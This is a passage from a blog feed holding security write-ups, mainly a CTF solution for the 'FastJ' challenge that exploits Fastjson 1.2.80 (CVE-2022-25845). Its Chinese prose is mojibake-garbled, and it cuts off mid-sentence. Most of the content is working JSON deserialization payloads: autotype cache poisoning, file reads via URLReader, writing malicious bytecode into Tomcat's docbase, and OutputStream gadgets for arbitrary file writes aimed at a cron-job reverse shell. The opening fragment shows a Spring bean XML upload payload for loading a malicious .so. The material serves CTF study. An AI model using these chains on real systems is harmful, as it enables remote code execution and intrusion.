class="hljs-string">&quot;decoder&quot;</span>/&gt;</span><br><span class="language-bash">        &lt;constructor-arg <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;int&quot;</span> value=<span class="hljs-string">&quot;0&quot;</span>/&gt;</span><br><span class="language-bash">        &lt;constructor-arg <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;int&quot;</span> value=<span class="hljs-string">&quot;5128&quot;</span>/&gt;</span><br><span class="language-bash">    &lt;/bean&gt;</span><br><span class="language-bash"></span><br><span class="language-bash">    &lt;bean factory-bean=<span class="hljs-string">&quot;clazz&quot;</span> factory-method=<span class="hljs-string">&quot;newInstance&quot;</span>/&gt;</span><br><span class="language-bash">&lt;/beans&gt;</span><br><span class="language-bash">------WebKitFormBoundaryINBwinb4uWPnBREL--</span><br></code></pre></td></tr></table></figure><p><img src="/2025/08/12/%E4%BB%8E%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9B%E4%B8%A4%E9%81%93java%E9%A2%98%E5%AD%A6%E7%82%B9%E5%B0%8Ftrick/image-20250822011335430.png" alt="image-20250822011335430"></p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>è¿™ä¸ªä¸Šä¼ å¹¶loadæ¶æ„soå’Œæ— å¤–ç½‘RCEè¿˜çœŸå€¼å¾—å¤šå­¦ä¹ å­¦ä¹ ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»äº¬éº’CTF2025-FastJçœ‹fastjsonçš„Any_File_Write-Chains</title>
    <link href="/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/"/>
    <url>/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>â€‹æœ€è¿‘äº‹æ¯”è¾ƒå¤šï¼Œå»é•¿æ²™æ‰“å®Œè½¯ä»¶å®‰å…¨èµ›æ‹¿äº†ä¸€ç­‰å¥–:</p><p><img src="/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/image-20250611200023261.png" alt="image-20250611200023261"></p><p>â€‹æœ¬æ¥æ˜¯æƒ³å¤ç°ä¸€ä¸‹é‚£ä¸¤é“javaçš„ï¼Œå…¶å®é‚£ä¸¤é“ååºåˆ—åŒ–åªè¦æ‰¾åˆ°èƒ½æ‰“çš„Servletå°±éšä¾¿å‡ºäº†ï¼Œå› ä¸ºä¾èµ–æœ‰CC3.1ã€‚</p><p>â€‹ä½†æ˜¯ç¯å¢ƒä¸å¤ªå¥½æ­ï¼Œå°±æ­¤ä½œç½¢äº†hhhã€‚</p><p>â€‹æ­£å¥½æœ€è¿‘æœ‰ä¸ªäº¬éº’CTFçš„FastJï¼Œæ‰“è¿™é“é¢˜å¿…é¡»èµ°JDK11çš„fjååºåˆ—åŒ–ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ç®€å•ç²—æš´çš„äº¤äº’ï¼š</p><p><img src="/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/image-20250611165719077.png" alt="image-20250611165719077"></p><h3 id="Fastjson1-2-80çš„ä»»æ„å†™åˆ©ç”¨"><a href="#Fastjson1-2-80çš„ä»»æ„å†™åˆ©ç”¨" class="headerlink" title="Fastjson1.2.80çš„ä»»æ„å†™åˆ©ç”¨"></a>Fastjson1.2.80çš„ä»»æ„å†™åˆ©ç”¨</h3><p><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">https://github.com/luelueking/CVE-2022-25845-In-Spring</a></p><p>é€šè¿‡è¿™ä¸ªpocå¯ä»¥å¾—çŸ¥ï¼Œé€šè¿‡ExceptionæœŸæœ›ç±»å¯ä»¥ç¼“å­˜ä¸€äº›æ–°ç±»ï¼Œç„¶åä¸Šé¢èƒ½ç¼“å­˜InputStreamï¼š</p><h4 id="Step1-æŠŠjava-io-InputStream-åŠ å…¥-fastjson-autotype-ç¼“å­˜"><a href="#Step1-æŠŠjava-io-InputStream-åŠ å…¥-fastjson-autotype-ç¼“å­˜" class="headerlink" title="Step1: æŠŠjava.io.InputStream åŠ å…¥ fastjson autotype ç¼“å­˜"></a>Step1: æŠŠjava.io.InputStream åŠ å…¥ fastjson autotype ç¼“å­˜</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;    \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;,    \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.exc.InputCoercionException\&quot;,    \&quot;p\&quot;: &#123;    &#125;  &#125;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.a.a&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonParser\&quot;,  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\&quot;,  \&quot;in\&quot;: &#123;&#125;&#125;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;d&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.c.c&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>[<img src="https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/%E6%88%AA%E5%B1%8F2024-11-07%2021.36.27.png" alt="æˆªå±2024-11-07 21.36.27">](<a href="https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/%E6%88%AA%E5%B1%8F2024-11-07">https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/æˆªå±2024-11-07</a> 21.36.27.png)</p><h4 id="Step2-fileåè®®è¯»å–-tmpå†…å®¹ï¼Œè·å–tomcatçš„docbaseæ–‡ä»¶åç§°"><a href="#Step2-fileåè®®è¯»å–-tmpå†…å®¹ï¼Œè·å–tomcatçš„docbaseæ–‡ä»¶åç§°" class="headerlink" title="Step2: fileåè®®è¯»å–&#x2F;tmpå†…å®¹ï¼Œè·å–tomcatçš„docbaseæ–‡ä»¶åç§°"></a>Step2: fileåè®®è¯»å–&#x2F;tmpå†…å®¹ï¼Œè·å–tomcatçš„docbaseæ–‡ä»¶åç§°</h4><blockquote><p>é€å­—èŠ‚è¯»å–å†…å®¹</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.InputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1024&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> $<span class="hljs-punctuation">&#123;</span>data<span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>      <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.a.delegate&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>[<img src="https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/%E6%88%AA%E5%B1%8F2024-11-07%2021.35.56.png" alt="æˆªå±2024-11-07 21.35.56">](<a href="https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/%E6%88%AA%E5%B1%8F2024-11-07">https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/æˆªå±2024-11-07</a> 21.35.56.png)</p><h4 id="Step3-å†™å…¥æ¶æ„å­—èŠ‚ç åˆ°docbaseç›®å½•ä¸‹"><a href="#Step3-å†™å…¥æ¶æ„å­—èŠ‚ç åˆ°docbaseç›®å½•ä¸‹" class="headerlink" title="Step3: å†™å…¥æ¶æ„å­—èŠ‚ç åˆ°docbaseç›®å½•ä¸‹"></a>Step3: å†™å…¥æ¶æ„å­—èŠ‚ç åˆ°docbaseç›®å½•ä¸‹</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.InputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.AutoCloseInputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;in&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;cs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.String&quot;</span><br>          <span class="hljs-string">&quot;$&#123;shellcode&#125;&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;charset&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;iso-8859-1&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> $<span class="hljs-punctuation">&#123;</span>size<span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.output.LockableFileWriter&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;file2write&#125;&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;charset&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;iso-8859-1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;charset&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;iso-8859-1&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;writeImmediately&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.InputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;inputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.a&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;iso-8859-1&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;iso-8859-1&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>[<img src="https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/%E6%88%AA%E5%B1%8F2024-11-07%2021.37.04.png" alt="æˆªå±2024-11-07 21.37.04">](<a href="https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/%E6%88%AA%E5%B1%8F2024-11-07">https://github.com/luelueking/CVE-2022-25845-In-Spring/blob/main/images/æˆªå±2024-11-07</a> 21.37.04.png)</p><h4 id="Step4-è§¦å‘æ¶æ„ç±»åŠ è½½"><a href="#Step4-è§¦å‘æ¶æ„ç±»åŠ è½½" class="headerlink" title="Step4: è§¦å‘æ¶æ„ç±»åŠ è½½"></a>Step4: è§¦å‘æ¶æ„ç±»åŠ è½½</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.chenzai.HackException&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¯ä»¥çœ‹åˆ°ï¼Œä»–æ‰“çš„æ˜¯common-ioã€‚æœ¬é¢˜çš„JDKæ˜¯11ï¼Œæœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿ</p><p>ç„¶è€ŒJDK11è‡ªå¸¦ç¬¦å·ä¿¡æ¯ï¼Œå¯ä»¥è°ƒç”¨ä»»æ„æ„é€ å‡½æ•°ã€‚çŒœæµ‹è¿˜æ˜¯åˆ©ç”¨OutputStreamä¸‹çš„å­ç±»å®ç°<strong>ä»»æ„æ–‡ä»¶å†™</strong>ã€‚</p><p>è€Œä¸”é¢˜ç›®çœ‹ä¼¼å¤šæ­¤ä¸€ä¸¾çš„ç»™äº†ä¸€ä¸ª<code>FilterFileOutputStream</code>ï¼š</p><img src="/2025/06/08/%E4%BB%8E%E4%BA%AC%E9%BA%92CTF2025-FastJ%E7%9C%8Bfastjson%E7%9A%84Any-File-Write-Chains/image-20250611194236153.png" class="" title="image-20250611194236153"><p>é¢˜ç›®é‚£ä¸ªgetflag()ä¸èƒ½ç›´æ¥è¯»ï¼Œä¼°è®¡å°±æ˜¯ç»™ä½ æç¤ºåˆ°ç”¨è¿™ä¸ª<code>FilterFileOutputStream</code>çš„ã€‚è¿™é“é¢˜å…¶å®æ˜¯å†™å®šæ—¶ä»»åŠ¡åå¼¹shellçš„ï¼Œä¹Ÿæ˜¯å¸¸è§çš„å†™æ–‡ä»¶Ræ–¹æ³•ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><h4 id="1ã€ç¼“å­˜OutputStream"><a href="#1ã€ç¼“å­˜OutputStream" class="headerlink" title="1ã€ç¼“å­˜OutputStream"></a>1ã€<strong>ç¼“å­˜OutputStream</strong></h4><h5 id="fastjsonçš„ç±»ç¼“å­˜æœºåˆ¶"><a href="#fastjsonçš„ç±»ç¼“å­˜æœºåˆ¶" class="headerlink" title="fastjsonçš„ç±»ç¼“å­˜æœºåˆ¶"></a>fastjsonçš„ç±»ç¼“å­˜æœºåˆ¶</h5><p>Fastjsonçš„ç±»ç¼“å­˜æœºåˆ¶ï¼š<code>ParserConfig.classMapping</code></p><p>å½“ä½¿ç”¨ @type åŠ è½½äº†ä¸€ä¸ªç±»ï¼ŒFastjson ä¼šæŠŠå®ƒç¼“å­˜èµ·æ¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">classMapping.put(typeName, clazz);<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸ºäº†æå‡è§£ææ€§èƒ½ã€å‡å°‘é‡å¤åå°„ã€‚</p><p>æ‰€ä»¥ï¼Œ<strong>åªè¦ä½ é€šè¿‡</strong> <strong>@type</strong> <strong>åŠ è½½äº†æŸä¸ªç±»</strong>ï¼ŒFastjson åç»­å°±å¯ä»¥ï¼š</p><p>å¤ç”¨è¿™ä¸ª Class å®ä¾‹ï¼Œå¹¶ä¸”ä¸å†æ£€æŸ¥autoTypeï¼ˆå› ä¸ºå·²ç»è¢«è®¤ä¸ºæ˜¯â€œåˆæ³•çš„â€äº†ï¼‰ </p><p>ç¼“å­˜æœºåˆ¶ç”±æ¥ï¼š  </p><ul><li><p>è¯¥æœºåˆ¶å¾ˆæ—©å°±æœ‰ï¼ˆè‡³å°‘åœ¨ 1.2.6+ å°±å­˜åœ¨ï¼‰ï¼Œæœ¬æ˜¯å‡ºäºæ€§èƒ½ç›®çš„ </p></li><li><p>åæ¥è¢«ç”¨äºå„ç§ Gadget åˆ©ç”¨é“¾ä¸­ä½œä¸ºâ€œclass å¼•å¯¼ç¼“å­˜â€æŠ€å·§</p></li></ul><p>ï¼ˆå‚è€ƒï¼š<a href="https://xz.aliyun.com/news/18127">2025äº¬éº’æ¯web-å…ˆçŸ¥ç¤¾åŒº</a>ï¼‰</p><p>æ ¹æ®ç¼“å­˜InputStreamçš„åˆ©ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°fastjsonçš„ç¼“å­˜OutputStreamçš„gadgetï¼Œä¸€ç›´æŠ¡åˆ°è§¦å‘Exceptionï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">com.fasterxml.jackson.core.json.UTF8JsonGenerator<br>com.fasterxml.jackson.core.JsonGenerator<br>com.fasterxml.jackson.core.JsonGenerationException<br>java.lang.Exception<br></code></pre></td></tr></table></figure><p>äºæ˜¯å¯ä»¥ä¾è‘«èŠ¦ç”»ç“¢å¾—å‡ºç¬¬ä¸€ä¸ªjsonï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123; \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;, \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonGenerationException\&quot;, \&quot;g\&quot;: &#123;&#125; &#125;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.a.a&quot;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123; \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonGenerator\&quot;, \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.json.UTF8JsonGenerator\&quot;, \&quot;out\&quot;: &#123;&#125; &#125;&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;d&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.c.c&quot;</span> <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h4 id="2ã€ä»»æ„æ–‡ä»¶å†™"><a href="#2ã€ä»»æ„æ–‡ä»¶å†™" class="headerlink" title="2ã€ä»»æ„æ–‡ä»¶å†™"></a>2ã€<strong>ä»»æ„æ–‡ä»¶å†™</strong></h4><p>fastjsonè™½ç„¶å†1.2.80ç¦ç”¨äº†<code>FileOutputStream</code>ï¼Œä½†è¿˜è®°å¾—é¢˜ç›®ç»™å‡ºçš„<code>FilterFileOutputStream</code>å—ï¼Ÿæ¥ä¸‹æ¥å¯ä»¥ç»“åˆrmbå®ç°ä»»æ„æ–‡ä»¶å†™ã€‚</p><h5 id="rmbï¼ˆRMI-Based-MarshalOutputStreamï¼‰"><a href="#rmbï¼ˆRMI-Based-MarshalOutputStreamï¼‰" class="headerlink" title="rmbï¼ˆRMI-Based MarshalOutputStreamï¼‰"></a>rmbï¼ˆ<strong>RMI-Based MarshalOutputStream</strong>ï¼‰</h5><p>æ˜¯ JDK 